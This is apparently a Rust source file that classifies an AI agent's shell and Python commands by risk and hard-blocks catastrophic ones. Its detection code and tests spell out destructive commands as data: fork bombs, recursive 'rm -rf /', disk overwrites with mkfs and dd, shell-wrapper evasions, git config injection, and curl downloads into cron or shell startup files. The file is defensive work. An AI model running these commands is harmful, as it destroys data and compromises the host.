/// deterministic hard-block.
fn catastrophic_reason(command: &str) -> Option<&'static str> {
    if is_fork_bomb(command) {
        return Some("a fork bomb (a recursive self-spawning process that exhausts the machine)");
    }
    if formats_or_overwrites_disk(command) {
        return Some(
            "a raw disk format or overwrite (mkfs, dd, or a redirect onto a block device)",
        );
    }
    for segment in command_segments(command) {
        if let Some(reason) = catastrophic_rm_or_chmod(&segment) {
            return Some(reason);
        }
    }
    None
}

/// Split a command line into individual command segments at shell control
/// operators (`;`, `&&`, `||`, `|`, `&`, newline) so a chained command like
/// `cd /tmp && rm -rf /` is analysed segment-by-segment. fd-duplications
/// (`2>&1`, `>&2`) are stripped first — they're pure plumbing, and splitting
/// on their `&` would shear `ls 2>&1` into a junk `1` segment that defeats
/// the safe fast-path for one of the most common shell shapes.
fn command_segments(command: &str) -> impl Iterator<Item = String> {
    static FD_DUP: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"\d*>&\d+").unwrap());
    static SEP: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"&&|\|\||;|\||&|\n").unwrap());
    let cleaned = FD_DUP.replace_all(command, " ").into_owned();
    SEP.split(&cleaned)
        .map(str::to_string)
        .collect::<Vec<_>>()
        .into_iter()
}

/// Detect a fork bomb: a function whose body pipes itself into itself and
/// backgrounds the result — `:(){ :|:& };:` and named variants like
/// `bomb(){ bomb|bomb& };bomb`. The function name is extracted in code (the
/// `regex` crate has no backreferences) and the body checked for `name|name`
/// plus a `&`.
fn is_fork_bomb(command: &str) -> bool {
    static DEF: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"([A-Za-z_:][A-Za-z0-9_]*)\s*\(\s*\)\s*\{").unwrap());
    for caps in DEF.captures_iter(command) {
        let name = caps.get(1).map(|m| m.as_str()).unwrap_or("");
        if name.is_empty() {
            continue;
        }
        let body_start = caps.get(0).map(|m| m.end()).unwrap_or(0);
        // Best-effort body: from the opening brace to the next `}`.
        let body = command[body_start..].split('}').next().unwrap_or("");
        let compact: String = body.chars().filter(|c| !c.is_whitespace()).collect();
        let self_pipe = format!("{name}|{name}");
        if compact.contains(&self_pipe) && compact.contains('&') {
            return true;
        }
    }
    false
}

/// Detect formatting a filesystem or overwriting a raw block device:
/// `mkfs[.fs] /dev/<disk>`, `dd ... of=/dev/<disk>`, or `> /dev/<disk>`.
/// Harmless device targets (`/dev/null`, `/dev/stdout`, …) are excluded via
/// [`is_disk_device`].
fn formats_or_overwrites_disk(command: &str) -> bool {
    static MKFS: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"\bmkfs(\.[A-Za-z0-9]+)?\b").unwrap());
    static OF: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"\bof=(\S+)").unwrap());
    static REDIRECT_DEV: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r#">>?\s*['"]?(/dev/[^\s'"|&;]+)"#).unwrap());

    if MKFS.is_match(command) && mentions_disk_device(command) {
        return true;
    }
    if OF.captures_iter(command).any(|c| is_disk_device(&c[1])) {
        return true;
    }
    REDIRECT_DEV
        .captures_iter(command)
        .any(|c| is_disk_device(&c[1]))
}

/// True if any `/dev/<name>` path mentioned in `command` is a raw disk device.
fn mentions_disk_device(command: &str) -> bool {
    static DEV_PATH: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"/dev/[A-Za-z0-9/_-]+").unwrap());
    DEV_PATH
        .find_iter(command)
        .any(|m| is_disk_device(m.as_str()))
}

/// True for a raw block device under `/dev/` (sd*, nvme*, disk*, …); false for
/// the harmless character devices (`/dev/null`, `/dev/stdout`, `/dev/zero`, …).
fn is_disk_device(raw: &str) -> bool {
    let path = raw.trim_matches(|c| c == '"' || c == '\'');
    let Some(dev) = path.strip_prefix("/dev/") else {
        return false;
    };
    const DISK_PREFIXES: &[&str] = &["sd", "hd", "vd", "xvd", "nvme", "mmcblk", "disk", "loop"];
    DISK_PREFIXES.iter().any(|pre| dev.starts_with(pre))
}

/// Detect a recursive `rm` or `chmod` whose target is the filesystem root or
/// home directory. Requires both a recursive flag AND a catastrophic target, so
/// `rm -rf data/tmp` or `chmod -R 755 data/` are untouched.
fn catastrophic_rm_or_chmod(segment: &str) -> Option<&'static str> {
    let toks: Vec<&str> = segment.split_whitespace().collect();
    let i = command_head_index(&toks);
    let head = toks.get(i)?;
    let base = head.rsplit('/').next().unwrap_or(head);
    let reason = match base {
        "rm" => "recursive deletion of the filesystem root or home directory",
        "chmod" => "a recursive permission change on the filesystem root or home directory",
        _ => return None,
    };
    let args = &toks[i + 1..];
    let recursive = args.iter().any(|a| is_recursive_flag(a));
    let targets_root = args.iter().any(|a| is_catastrophic_target(a));
    (recursive && targets_root).then_some(reason)
}

/// Command-line tokens that prefix the real command and should be skipped when
/// looking for the command head: privilege/wrapper words and `VAR=value`
/// environment assignments.
fn is_benign_prefix(tok: &str) -> bool {
    matches!(
        tok,
        "sudo" | "env" | "command" | "time" | "nice" | "builtin" | "exec" | "\\"
    ) || (!tok.starts_with('-') && tok.contains('='))
}

/// Walk past the tokens that precede the real command word and return the index
/// of the command head in `toks` (or `toks.len()` when the segment is only
/// prefixes/redirects, so no command runs). Skips two kinds of preamble:
///   * benign privilege/wrapper prefixes + `VAR=value` ([`is_benign_prefix`]),
///   * **leading I/O redirections** — bash allows `2>log cmd args`, so a redirect
///     before the command must not be mistaken for the command itself (otherwise
///     `2>log rm -rf /` would slip past both the safe-list and the catastrophic
///     deny-list).
fn command_head_index(toks: &[&str]) -> usize {
    let mut i = 0;
    while let Some(tok) = toks.get(i) {
        if is_benign_prefix(tok) {
            i += 1;
        } else if let Some(needs_target) = redirect_token_needs_target(tok) {
            i += if needs_target { 2 } else { 1 };
        } else {
            break;
        }
    }
    i
}

/// If `tok` is an I/O-redirection operator (`>`, `>>`, `<`, `2>`, `&>`, …),
/// return whether its target is the *following* token (`2> file` → `true`)
/// rather than glued onto this one (`2>file`, `2>&1` → `false`). `None` when
/// `tok` is not a redirect.
fn redirect_token_needs_target(tok: &str) -> Option<bool> {
    let rest = tok.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
    let after = rest
        .strip_prefix(">>")
        .or_else(|| rest.strip_prefix('>'))
        .or_else(|| rest.strip_prefix('<'))?;
    Some(after.is_empty())
}

/// True when a segment contains command or process substitution — constructs
/// that execute an embedded command (`$(...)`, backticks, `<(...)`, `>(...)`).
/// Such a segment is never settled Safe regardless of its head (`echo $(rm -rf
/// /)` would otherwise pass on `echo`); the judge sees the full text instead.
fn has_command_substitution(segment: &str) -> bool {
    segment.contains("$(")
        || segment.contains('`')
        || segment.contains("<(")
        || segment.contains(">(")
}

/// True for a recursive flag in either long (`--recursive`) or short-cluster
/// (`-r`, `-R`, `-rf`, `-fr`, `-Rf`) form.
fn is_recursive_flag(arg: &str) -> bool {
    if arg == "--recursive" {
        return true;
    }
    if arg.starts_with("--") {
        return false;
    }
    match arg.strip_prefix('-') {
        Some(cluster) => cluster.chars().any(|c| c == 'r' || c == 'R'),
        None => false,
    }
}

/// True for a token that names the filesystem root or home directory (the only
/// targets the catastrophic lane recognises), tolerating surrounding quotes and
/// the common `$HOME` / `~` spellings.
fn is_catastrophic_target(tok: &str) -> bool {
    let t = tok.trim_matches(|c| c == '"' || c == '\'');
    matches!(
        t,
        "/" | "/*"
            | "~"
            | "~/"
            | "~/*"
            | "$HOME"
            | "${HOME}"
            | "$HOME/"
            | "${HOME}/"
            | "$HOME/*"
            | "${HOME}/*"
    )
}

// ===========================================================================
// IrreversibleDanger — the static "dangerous" list, now category-tagged.
//
// Phase 3 demoted this from the primary detector to TWO supporting roles, and
// Phase 5 makes both category-aware (so an unattended trigger can match a
// command against its side-effect grant):
//   1. [`fallback_classify`] — the classification used for the ambiguous middle
//      when the judge is off (`command_guard_judge=false`) or unavailable (no
//      provider / a failed call). It flags the obvious side-effects (this
//      list), routes destruction shapes via the static destruction scan, and
//      runs the rest. The matching [`SideEffectCategory`] is what the trigger
//      grant check (Phase 5) keys on when the judge is unavailable.
//   2. [`permission_summary`] — the card text when the judge produced no
//      tailored summary (judge off / failed); derived from the category.
// The judge (`engine::command_judge`) is the primary classifier and both widens
// coverage (novel side-effects, out-of-workspace destruction) and cuts false
// positives. Keep this list conservative: every match costs a permission prompt
// (chat) or a trigger block (trigger) on the fallback path.
// ===========================================================================

/// The [`SideEffectCategory`] a command statically looks like — the static
/// counterpart of the judge's category tag, used by [`fallback_classify`] /
/// [`permission_summary`] and as the trigger grant key when the judge is
/// unavailable. `None` when no obvious side-effect shape matches. Scans both
/// shapes: per-segment shell command heads (bash) and inline Python
/// side-effect calls (the python `code` field). Each scan is harmless on the
/// other tool's text — Python code has no matching shell head, and a shell
/// command has no `requests.post(`. Out-of-workspace destruction is not this
/// list's job — [`fallback_classify`]'s destruction scan tags it.
pub fn static_side_effect_category(command: &str) -> Option<SideEffectCategory> {
    if let Some(cat) = python_side_effect_category(command) {
        return Some(cat);
    }
    command_segments(command).find_map(|s| segment_side_effect_category(&s))
}

/// Side-effect category for one shell command segment, or `None`. Skips the same
/// benign prefixes the catastrophic scan does so `sudo curl -X POST …` is seen.
fn segment_side_effect_category(segment: &str) -> Option<SideEffectCategory> {
    let toks: Vec<&str> = segment.split_whitespace().collect();
    let i = command_head_index(&toks);
    let head = toks.get(i)?;
    let base = head.rsplit('/').next().unwrap_or(head);
    let args = &toks[i + 1..];
    match base {
        "curl" | "wget" => is_mutating_http(args).then_some(SideEffectCategory::ExternalApi),
        "mail" | "mailx" | "sendmail" | "osascript" => Some(SideEffectCategory::Email),
        "gh" | "aws" | "gcloud" => Some(SideEffectCategory::CloudCli),
        _ => None,
    }
}

/// True when curl/wget args carry a write HTTP method or a request body/upload
/// — the signal that the call mutates server state rather than just reading.
/// A bare `curl https://…` (a GET) is NOT flagged.
fn is_mutating_http(args: &[&str]) -> bool {
    const MUTATING_METHODS: &[&str] = &["POST", "PUT", "DELETE", "PATCH"];
    // Data / upload flags imply a body (curl defaults to POST when given data;
    // `--json` is POST with JSON headers; wget's --post-data/--post-file
    // always POST).
    const BODY_FLAGS: &[&str] = &[
        "--data",
        "-d",
        "--data-raw",
        "--data-binary",
        "--data-urlencode",
        "--data-ascii",
        "--json",
        "--form",
        "--form-string",
        "-F",
        "--upload-file",
        "-T",
        "--post-data",
        "--post-file",
    ];
    let mut prev_was_method_flag = false;
    for arg in args {
        let upper = arg.to_ascii_uppercase();
        // `-X POST` / `--request PUT` — method in the next token.
        if prev_was_method_flag {
            if MUTATING_METHODS.iter().any(|m| upper == *m) {
                return true;
            }
            prev_was_method_flag = false;
        }
        if *arg == "-X" || *arg == "--request" || *arg == "--method" {
            prev_was_method_flag = true;
            continue;
        }
        // Combined `-XPOST` / `--request=PUT` / `--method=POST`.
        for pre in ["-X", "--request=", "--method="] {
            if let Some(rest) = upper.strip_prefix(&pre.to_ascii_uppercase()) {
                if MUTATING_METHODS.contains(&rest) {
                    return true;
                }
            }
        }
        // Body / upload flags, both the space-separated form (`--data 'x'`) and
        // the `=`-glued long-flag form (`--data=x`, `--post-data=x`). Glued
        // short-flag forms (`-d@file`) are not matched — the LLM emits the
        // space-separated form, and the Phase 3 judge covers the long tail.
        if BODY_FLAGS.contains(arg)
            || BODY_FLAGS
                .iter()
                .any(|f| f.len() > 2 && arg.starts_with(&format!("{f}=")))
        {
            return true;
        }
    }
    false
}

/// The side-effect category of Python `code`, or `None`. Best-effort substring
/// match (the judge does the real work later): the common `requests.<write>(`,
/// `httpx.<write>(`, and `session.<write>(` shapes map to
/// [`SideEffectCategory::ExternalApi`]; `smtplib` maps to
/// [`SideEffectCategory::Email`].
fn python_side_effect_category(code: &str) -> Option<SideEffectCategory> {
    const WRITE_CALLS: &[&str] = &[
        "requests.post(",
        "requests.put(",
        "requests.patch(",
        "requests.delete(",
        "httpx.post(",
        "httpx.put(",
        "httpx.patch(",
        "httpx.delete(",
        "session.post(",
        "session.put(",
        "session.patch(",
        "session.delete(",
    ];
    if WRITE_CALLS.iter().any(|c| code.contains(c)) {
        return Some(SideEffectCategory::ExternalApi);
    }
    if code.contains("smtplib") {
        return Some(SideEffectCategory::Email);
    }
    None
}

/// The command head (basename, with benign privilege/wrapper prefixes and
/// leading redirects skipped) of every segment of `command` that actually runs
/// a command: `sudo /usr/bin/aws s3 rm x && curl -X POST u` → `["aws", "curl"]`.
/// Redirect-only / empty segments contribute nothing. Used by the permission
/// lane's auto-allow matching, which requires EVERY head to be covered by a
/// granted `Bash(<head>:*)` pattern — matching only the first head would let a
/// dangerous trailing segment ride into a grant for a harmless leading one.
pub fn segment_heads(command: &str) -> Vec<String> {
    command_segments(command)
        .filter_map(|segment| {
            let toks: Vec<&str> = segment.split_whitespace().collect();
            let i = command_head_index(&toks);
            let head = toks.get(i)?;
            let base = head.rsplit('/').next().unwrap_or(head);
            (!base.is_empty()).then(|| base.to_string())
        })
        .collect()
}

/// The first entry of [`segment_heads`] — used to derive the `Bash(<head>:*)`
/// allow-pattern STORED by an "Always allow" click (the card's narrow button is
/// labeled with it). `/usr/bin/git push` → `git`, `sudo aws s3 …` → `aws`.
/// `None` for a command that runs nothing. Deterministic so the stored pattern
/// matches the pattern checked on the next prompt.
pub fn first_command_token(command: &str) -> Option<String> {
    segment_heads(command).into_iter().next()
}

/// The fallback one-line card text for an `IrreversibleDanger` permission
/// prompt — used only when the judge produced no tailored summary (judge off or
/// failed). Derived from the static side-effect category. The command itself is
/// carried separately on the `CommandPermissionRequested` event and shown by the
/// card.
pub fn permission_summary(tool_name: &str, input: &Value) -> String {
    let cmd = command_text(tool_name, input).unwrap_or("");
    let reason = static_side_effect_category(cmd)
        .map(|c| c.reason())
        .unwrap_or("an irreversible real-world side-effect");
    format!("May perform {reason}.")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn bash(cmd: &str) -> StaticVerdict {
        static_classify(tn::RUN_BASH, &json!({ "command": cmd }))
    }

    fn python(code: &str) -> StaticVerdict {
        static_classify(tn::RUN_PYTHON, &json!({ "code": code }))
    }

    fn assert_settled(v: StaticVerdict, lane: RiskLane, ctx: &str) {
        assert_eq!(v, StaticVerdict::Settled(lane), "{ctx}");
    }

    fn assert_needs_judge(v: StaticVerdict, ctx: &str) {
        assert!(
            matches!(v, StaticVerdict::NeedsJudge(_)),
            "{ctx} — expected NeedsJudge, got {v:?}"
        );
    }

    // --- Catastrophic: recursive rm/chmod of root or home -------------------

    #[test]
    fn catastrophic_rm_root_and_obfuscations() {
        for cmd in [
            "rm -rf /",
            "rm -rf /*",
            "rm -fr /",
            "rm -r -f /",
            "rm --recursive --force /",
            "rm  -rf   /",  // collapsed whitespace
            "rm -rf \"/\"", // quoted target
            "rm -rf '/'",
            "rm -rf -- /",   // end-of-options
            "sudo rm -rf /", // privilege prefix
            "rm -rf ~",
            "rm -rf ~/",
            "rm -rf $HOME",
            "rm -rf ${HOME}",
            "cd /tmp && rm -rf /", // chained segment
            "/bin/rm -rf /",       // absolute path to rm
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn catastrophic_survives_a_shell_c_wrapper() {
        // Every scan reads a segment's HEAD token, so a `sh -c '<script>'`
        // wrapper used to hide the payload behind head `bash`/`zsh`: the
        // catastrophic hard-block was skipped and, with the judge off, the
        // static fallback settled it Safe and ran `rm -rf /` with no card.
        for cmd in [
            "bash -c 'rm -rf /'",
            "bash -c \"rm -rf /\"",
            "/bin/zsh -lc 'rm -rf ~'",
            "sh -c 'chmod -R 777 /'",
            "bash -c 'cd /tmp && rm -rf /'",
            // `sh -c <script> [$0 [arg ...]]`: the script is ONE word and the
            // operands after it only set $0 and the positional params, so these
            // run `rm -rf /` too. Cutting at the matching close quote is what
            // stops the head token from reading as `'rm`.
            "bash -c 'rm -rf /' ignored",
            "bash -c \"rm -rf /\" sh extra",
            "/bin/zsh -lc 'rm -rf ~' zsh",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn catastrophic_chmod_root() {
        for cmd in [
            "chmod -R 777 /",
            "chmod -R 000 /",
            "chmod --recursive 777 ~",
            "sudo chmod -R 777 ${HOME}",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn in_workspace_rm_chmod_goes_to_judge() {
        // No longer settled Safe statically — `rm`/`chmod`/`mv`/`cp` are
        // destructive shapes the judge classifies (in-workspace → reversible,
        // out-of-workspace → irreversible). The point: they are NOT catastrophic
        // and NOT auto-safe; the judge (or static fallback) decides.
        for cmd in [
            "rm -rf data/tmp",
            "rm -rf ./build",
            "rm data/artifacts/report.csv",
            "rm -f data/cache/x",
            "chmod -R 755 data/apps/foo",
            "mv data/a data/b",
            "cp data/a data/b",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn safe_when_mentioning_but_not_running_rm() {
        // Searching logs / printing the string must not be mistaken for running
        // it — the head is read-only.
        for cmd in [
            "grep -r \"rm -rf /\" logs/",
            "echo 'never run rm -rf /'",
            "cat notes_about_rm_-rf_slash.txt",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn rm_is_never_catastrophic_without_root_target() {
        // Not catastrophic (no recursive-root match) → the judge sees them.
        for cmd in ["rm /", "rm -f /", "rm -rf /home/user/project"] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    // --- Catastrophic: fork bombs ------------------------------------------

    #[test]
    fn catastrophic_fork_bombs() {
        for cmd in [
            ":(){ :|:& };:",
            ":(){:|:&};:",
            "bomb(){ bomb|bomb& };bomb",
            "f() { f | f & }",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    // --- Catastrophic: disk format / overwrite -----------------------------

    #[test]
    fn catastrophic_disk_ops() {
        for cmd in [
            "mkfs.ext4 /dev/sda",
            "mkfs /dev/nvme0n1",
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "dd if=/dev/zero of=/dev/disk2",
            "cat image.iso > /dev/sdb",
            "echo x >/dev/nvme0n1",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn safe_harmless_device_redirects_and_reads() {
        // Read-only heads + harmless `/dev/null`-style redirects stay Safe.
        for cmd in [
            "echo hi > /dev/null",
            "command 2>/dev/null",
            "cat /dev/urandom | head -c 16 > data/seed",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
        // `dd` is not a read-only head — even an in-workspace target goes to the
        // judge (dd can also overwrite devices).
        assert_needs_judge(
            bash("dd if=/dev/zero of=data/zeros.bin bs=1M count=10"),
            "dd to file",
        );
    }

    // --- Static safe-list -------------------------------------------------

    #[test]
    fn safe_read_only_commands() {
        for cmd in [
            "ls -la",
            "cat data/x.txt",
            "grep -r foo src/",
            "git status",
            "git log --oneline -20",
            "git diff HEAD~1",
            "git -C some/repo show",
            "wc -l data/x.csv",
            "head -n 5 data/y",
            "jq '.a' data/z.json",
            "cat /etc/hosts", // out-of-workspace READ is safe (wanted)
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn safe_in_workspace_writes_and_creates() {
        for cmd in [
            "mkdir -p data/out",
            "touch data/out/.keep",
            "echo hello > data/out/x.txt",
            "printf '%s' done >> data/log",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn create_outside_workspace_goes_to_judge() {
        for cmd in ["mkdir /etc/evil", "touch ~/marker", "echo x > /etc/passwd"] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn mutating_or_unknown_commands_go_to_judge() {
        // git non-read-only subcommands, package managers, and arbitrary unknown
        // heads all fall through to the judge.
        for cmd in [
            "git push origin main",
            "git commit -m x",
            "git branch -D feature",
            "npm install",
            "cargo publish",
            "make deploy",
            "python script.py",
            "bash deploy.sh",
            "awk 'BEGIN{system(\"x\")}'",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn dangerous_shapes_go_to_judge_not_settled() {
        // What Phase 2 settled IrreversibleDanger statically now goes to the
        // judge (which produces the lane + tailored summary).
        for cmd in [
            "curl -X POST https://api.example.com/charge",
            "curl -d 'amount=100' https://api.example.com/pay",
            "wget --post-data='x=1' https://api.example.com/pay",
            "osascript -e 'tell application \"Mail\" to send'",
            "echo body | mail -s subj a@b.com",
            "gh pr create --fill",
            "aws s3 rm s3://bucket/key",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn safe_read_only_http() {
        // A plain GET (or download) is settled Safe — no judge call, no prompt.
        for cmd in [
            "curl https://example.com",
            "curl -s https://example.com/data.json",
            "curl -O https://example.com/file.tar.gz",
            "wget https://example.com/file.tar.gz",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn out_of_workspace_redirect_breaks_safe() {
        // A read-only head with an out-of-workspace write redirect is NOT safe.
        assert_needs_judge(bash("grep x data/f > /etc/out"), "redirect outside ws");
        // Same head redirecting in-workspace stays safe.
        assert_settled(
            bash("grep x data/f > data/out"),
            RiskLane::Safe,
            "redirect in ws",
        );
    }

    // --- Safe-list evasion regressions (harden findings) -------------------

    #[test]
    fn leading_redirect_does_not_mask_the_command() {
        // A redirect BEFORE the command must not be taken for the command word.
        // The real command after it is classified, in both lanes:
        assert_settled(
            bash("2>data/log rm -rf /"),
            RiskLane::Catastrophic,
            "leading-redirect catastrophic",
        );
        assert_settled(
            bash(">out.txt rm -rf /"),
            RiskLane::Catastrophic,
            "leading-redirect catastrophic 2",
        );
        assert_needs_judge(
            bash("2>data/log curl -X POST https://x"),
            "leading-redirect side-effect",
        );
        assert_needs_judge(bash("2>data/log make deploy"), "leading-redirect unknown");
        // A genuinely redirect-only segment is still safe.
        assert_settled(bash("command 2>/dev/null"), RiskLane::Safe, "redirect-only");
        assert_settled(
            bash("2>/dev/null ls -la"),
            RiskLane::Safe,
            "leading harmless redirect + read",
        );
    }

    #[test]
    fn command_substitution_is_never_settled_safe() {
        // A dangerous command hidden in a substitution under a safe head must
        // reach the judge, not be settled Safe on the outer head.
        for cmd in [
            "echo $(rm -rf /etc/nginx)",
            "echo `curl -d x https://evil/pay`",
            "cat <(curl -X POST https://x)",
            "ls $(find / -name secret)",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn curl_download_outside_workspace_goes_to_judge() {
        // A GET that writes its output OUTSIDE the workspace is not safe —
        // space-separated and `=`-glued output flags are both caught.
        for cmd in [
            "curl -o /etc/cron.d/evil https://x/payload",
            "curl --output ~/.bashrc https://x/p",
            "curl --output=/etc/passwd https://x/p",
            "wget -O /etc/passwd https://x/p",
            "wget --output-document=/etc/passwd https://x/p",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // In-workspace download targets stay safe.
        assert_settled(
            bash("curl -o data/out.json https://x/d"),
            RiskLane::Safe,
            "download in ws",
        );
    }

    #[test]
    fn git_config_injection_goes_to_judge() {
        for cmd in [
            "git -c core.pager=reboot log",
            "git --config-env=GIT_PAGER log",
            "git -c alias.x='!sh' status",
            "git --exec-path=/tmp/evil log",
            "git --exec-path /tmp/evil log",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // Benign global flags (`-C <dir>`) on a read-only subcommand stay safe.
        assert_settled(
            bash("git -C some/repo log"),
            RiskLane::Safe,
            "git -C read-only",
        );
    }

    #[test]
    fn python_filesystem_destruction_goes_to_judge() {
        for code in [
            "import shutil; shutil.rmtree('/home/user')",
            "import os; os.remove('/etc/passwd')",
            "from pathlib import Path; Path('/etc/x').unlink()",
            "import os; os.rename('a', '/etc/b')",
            "__import__('os').system('rm -rf /etc')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    // --- Python static classification --------------------------------------

    #[test]
    fn python_pure_compute_and_reads_are_safe() {
        for code in [
            "print(sum(range(100)))",
            "import pandas as pd; pd.read_csv('data/x.csv')",
            "import requests; requests.get('https://example.com').json()", // GET, no signal
            "open('data/out.txt','w').write('hi')",
        ] {
            assert_settled(python(code), RiskLane::Safe, code);
        }
    }

    #[test]
    fn python_side_effect_shapes_go_to_judge() {
        for code in [
            "import requests; requests.post('https://api.example.com/x', json={})",
            "requests.delete(url)",
            "import smtplib; s = smtplib.SMTP('localhost')",
            "import httpx; httpx.put(url, content=b'x')",
            "import subprocess; subprocess.run(['rm','-rf','/etc'])",
            "import os; os.system('echo hi')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    #[test]
    fn python_code_catastrophic_shellout_is_blocked() {
        // Embedded disk ops in a python shell-out are caught by the full-text
        // catastrophic scan, ahead of the side-effect signal.
        assert_settled(
            python("import os; os.system('mkfs.ext4 /dev/sda')"),
            RiskLane::Catastrophic,
            "python mkfs shellout",
        );
    }

    // --- Non-bash/python tools are never inspected -------------------------

    #[test]
    fn non_command_tools_always_safe() {
        assert_settled(
            static_classify(tn::WRITE_FILE, &json!({ "path": "/", "content": "x" })),
            RiskLane::Safe,
            "write_file",
        );
        assert_settled(
            static_classify(tn::READ_FILE, &json!({ "path": "data/x" })),
            RiskLane::Safe,
            "read_file",
        );
    }

    #[test]
    fn catastrophic_outranks_everything() {
        // Catastrophic is checked first, so a command that is both catastrophic
        // and side-effect-shaped is hard-blocked, never judged.
        assert_settled(
            bash("rm -rf / && curl -X POST https://x"),
            RiskLane::Catastrophic,
            "catastrophic + side-effect",
        );
    }

    // --- Out-of-workspace marker -------------------------------------------

    #[test]
    fn judge_input_carries_out_of_workspace_marker() {
        let StaticVerdict::NeedsJudge(ji) = bash("rm -rf /etc/nginx") else {
            panic!("expected NeedsJudge");
        };
        assert!(
            ji.out_of_workspace,
            "out-of-workspace target must be flagged"
        );

        let StaticVerdict::NeedsJudge(ji) = bash("rm -rf data/tmp") else {
            panic!("expected NeedsJudge");
        };
        assert!(
            !ji.out_of_workspace,
            "in-workspace target must not be flagged"
        );
    }

    #[test]
    fn escapes_workspace_detects_paths_and_redirects() {
        assert!(command_escapes_workspace("rm -rf /etc/x"));
        assert!(command_escapes_workspace("cp data/a ~/b"));
        assert!(command_escapes_workspace("echo x > /tmp/y"));
        assert!(command_escapes_workspace("cat ../secret"));
        assert!(!command_escapes_workspace("rm -rf data/tmp"));
        assert!(!command_escapes_workspace("cp data/a ./b"));
        assert!(!command_escapes_workspace("curl -X POST https://x")); // URL, not a path
        assert!(!command_escapes_workspace("echo hi > /dev/null")); // harmless sink
    }

    // --- Static fallback (judge off / unavailable) --------------------------

    fn fb_bash(cmd: &str) -> JudgedClassification {
        fallback_classify(&JudgeInput {
            tool_name: tn::RUN_BASH.to_string(),
            command: cmd.to_string(),
            out_of_workspace: false,
        })
    }

    fn fb_python(code: &str) -> JudgedClassification {
        fallback_classify(&JudgeInput {
            tool_name: tn::RUN_PYTHON.to_string(),
            command: code.to_string(),
            out_of_workspace: false,
        })
    }

    #[test]
    fn fallback_flags_side_effect_shapes_with_summary() {
        // The dangerous shapes the static side-effect list recognises → ask,
        // with a category-derived card summary.
        for cmd in [
            "curl -X POST https://api.example.com/charge",
            "osascript -e 'tell application \"Mail\" to send'",
            "gh pr create --fill",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
            assert!(c.category.is_some(), "{cmd}");
            assert!(
                c.summary
                    .as_deref()
                    .is_some_and(|s| s.starts_with("May perform")),
                "{cmd}"
            );
        }
        for code in [
            "import requests; requests.post(url)",
            "import smtplib; smtplib.SMTP('x')",
        ] {
            assert_eq!(fb_python(code).lane, RiskLane::IrreversibleDanger, "{code}");
        }
        // Ordinary tools still run — the fallback only flags recognised shapes.
        for cmd in ["npm install", "git push", "make deploy"] {
            assert_eq!(fb_bash(cmd).lane, RiskLane::Safe, "{cmd}");
        }
    }

    #[test]
    fn fallback_asks_for_out_of_workspace_destruction() {
        // The former documented limit, now closed: destruction with an
        // out-of-workspace target is caught statically → ask, tagged
        // OutOfWorkspaceDestruction (so an unattended trigger must grant it).
        for cmd in [
            "rm -rf /etc/nginx",
            "rm ~/important.txt",
            "sudo rm -rf /var/lib/x",
            "shred -u ~/.ssh/id_rsa",
            "truncate -s 0 /var/log/system.log",
            "mv data/a /etc/b",
            "cp data/x ~/.zshrc",
            "dd if=data/img of=/Users/me/file",
            "grep x data/f > /etc/cron.d/job",
            "git status && rm -rf ~/docs",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
            assert_eq!(
                c.category,
                Some(SideEffectCategory::OutOfWorkspaceDestruction),
                "{cmd}"
            );
            assert!(
                c.summary
                    .as_deref()
                    .is_some_and(|s| s.contains("outside the workspace")),
                "{cmd}"
            );
        }
    }

    #[test]
    fn fallback_checkpoints_in_workspace_destruction() {
        // Destruction confined to the workspace → the checkpoint lane (snapshot
        // + run, no prompt) instead of running bare.
        for cmd in [
            "rm -rf data/tmp",
            "rm x.txt",
            "mv data/a data/b",
            "cp data/a data/b",
            "truncate -s 0 data/log",
            "dd if=/dev/zero of=data/zeros.bin bs=1M count=1",
            // Importing INTO the workspace: only the in-workspace destination
            // can be clobbered (mv's source-side removal is relocation, not
            // data loss), so the checkpoint covers it — no prompt.
            "mv /tmp/download.csv data/in.csv",
            "cp /etc/hosts data/",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::ReversibleDanger, "{cmd}");
            assert_eq!(c.category, None, "{cmd}");
        }
    }

    #[test]
    fn fallback_leaves_out_of_workspace_reads_safe() {
